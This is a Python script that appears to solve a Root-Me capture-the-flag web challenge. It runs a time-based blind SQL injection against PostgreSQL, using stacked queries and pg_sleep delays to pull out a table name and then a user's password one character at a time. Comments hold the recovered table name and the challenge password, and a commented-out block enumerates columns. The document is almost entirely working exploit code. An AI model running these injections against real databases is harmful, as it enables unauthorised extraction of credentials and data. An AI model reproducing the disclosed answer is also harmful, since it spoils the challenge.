import requests
from time import time
import string

table_name = '' #users
len_table = 0 #5
offset_table = 0 #1
len_password = 0 #13
passwd = '' #T!m3B@s3DSQL!
column = ''
len_column = 0

for l in range(0,10):
	t = time()
	r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;+select+case+when+(select +substr(table_name,1,3)+from+information_schema.tables+limit+1+offset+"+str(l)+")= chr(112)||chr(103)||chr(95)+then+pg_sleep(0)+else+pg_sleep(2)+end--")
	t = time() - t
	if t > 2:
		t = time()
		r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;+select+case+when+(select +substr(table_name,1,3)+from+information_schema.tables+limit+1+offset+"+str(l)+")= chr(112)||chr(103)||chr(95)+then+pg_sleep(0)+else+pg_sleep(2)+end--")
		t = time() - t
		if t > 2:
			offset_table = l
			break
print "Offset_table: ",offset_table


for j in range(0,15):
	t = time()
	r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;+select+case+when+(select +length(table_name)+from+information_schema.tables+limit+1+offset+"+ str(offset_table) +")="+ str(j) +"+then+pg_sleep(2)+else+pg_sleep(0)+end--")
	t = time() - t
	if t > 2:
		t = time()
		r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;+select+case+when+(select +length(table_name)+from+information_schema.tables+limit+1+offset+"+ str(offset_table) +")="+ str(j) +"+then+pg_sleep(2)+else+pg_sleep(0)+end--")
		t = time() - t
		if t > 2:
			len_table = j
			break
print "Length_table: ",len_table


for k in range(1, len_table + 1):		
	for i in range(33,126):
		t = time()
		r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1; select case when (select substr(table_name,"+ str(k) +",1)+from+information_schema.tables+limit+1+offset+"+ str(offset_table) +") = chr("+ str(i) +") then pg_sleep(2) else pg_sleep(0) end--")
		t = time() - t
		if t > 2:
			t = time()
			r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1; select case when (select substr(table_name,"+ str(k) +",1)+from+information_schema.tables+limit+1+offset+"+ str(offset_table) +") = chr("+ str(i) +") then pg_sleep(2) else pg_sleep(0) end--")
			t = time() - t
			if t > 2:
				table_name += chr(i)
				print "Table_name: " + table_name
				break

for p in range(0,15):
	t = time()
	r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;+select+case+when+(select +length(password)+from+"+ table_name+"+where+id=1)="+ str(p) +"+then+pg_sleep(2)+else+pg_sleep(0)+end--")
	t = time() - t
	if t > 2:
		t = time()
		r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;+select+case+when+(select +length(password)+from+"+ table_name+"+where+id=1)="+ str(p) +"+then+pg_sleep(2)+else+pg_sleep(0)+end--")
		t = time() - t
		if t > 2:
			len_password = p
			break
print "Length_password: ",len_password			
			
			
for m in range(1, len_password + 1):		
	for n in range(33,126):
		t = time()
		r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1; select case when (select substr(password,"+ str(m) +",1)+from+"+ table_name +"+where+id=1)=chr("+ str(n) +") then pg_sleep(2) else pg_sleep(0) end--")
		t = time() - t
		if t > 2:
			t = time()
			r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1; select case when (select substr(password,"+ str(m) +",1)+from+"+ table_name +"+where+id=1)=chr("+ str(n) +") then pg_sleep(2) else pg_sleep(0) end--")
			t = time() - t
			if t > 2:
				passwd += chr(n)
				print "Password: " + passwd
				break

#check password			
# for m in range(1, len_password + 1):		
	# t = time()
	# c = ord(passwd[m-1])
	# r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1; select case when (select substr(password,"+ str(m) +",1)+from+"+ table_name +"+where+id=1)=chr("+str(c)+") then pg_sleep(2) else pg_sleep(0) end--")
	# t = time() - t
	# if t > 2:
		# print "Ok"
	# else:
		# print "Fail"

# find column_name	
# for o in range(0,7):
	# print "Offset: ", o
	# for j in range(0,15):
		# t = time()
		# r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;+select+case+when+(select +length(column_name)+from+information_schema.columns+where+table_name=chr(117)||chr(115)||chr(101)||chr(114)||chr(115)+limit+1+offset+"+ str(o) +")="+ str(j) +"+then+pg_sleep(2)+else+pg_sleep(0)+end--")
		# t = time() - t
		# if t > 2:
			# t = time()
			# r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;+select+case+when+(select +length(column_name)+from+information_schema.columns+where+table_name=chr(117)||chr(115)||chr(101)||chr(114)||chr(115)+limit+1+offset+"+ str(o) +")="+ str(j) +"+then+pg_sleep(2)+else+pg_sleep(0)+end--")
			# t = time() - t
			# if t > 2:
				# len_column = j
				# break
	# print "+Length_column: ",len_column
	# for m in range(1, len_column + 1):		
		# for n in range(33,126):
			# t = time()
			# r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;+select+case+when+(select +substr(column_name,"+str(m)+",1)+from+information_schema.columns+where+table_name=chr(117)||chr(115)||chr(101)||chr(114)||chr(115)+limit+1+offset+"+ str(o) +")=chr("+ str(n) +")+then+pg_sleep(2)+else+pg_sleep(0)+end--")
			# t = time() - t
			# if t > 2:
				# t = time()
				# r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;+select+case+when+(select +substr(column_name,"+str(m)+",1)+from+information_schema.columns+where+table_name=chr(117)||chr(115)||chr(101)||chr(114)||chr(115)+limit+1+offset+"+ str(o) +")=chr("+ str(n) +")+then+pg_sleep(2)+else+pg_sleep(0)+end--")
				# t = time() - t
				# if t > 2:
					# column += chr(n)
					# print "+Column: " + column
					# break
	# column += "-"
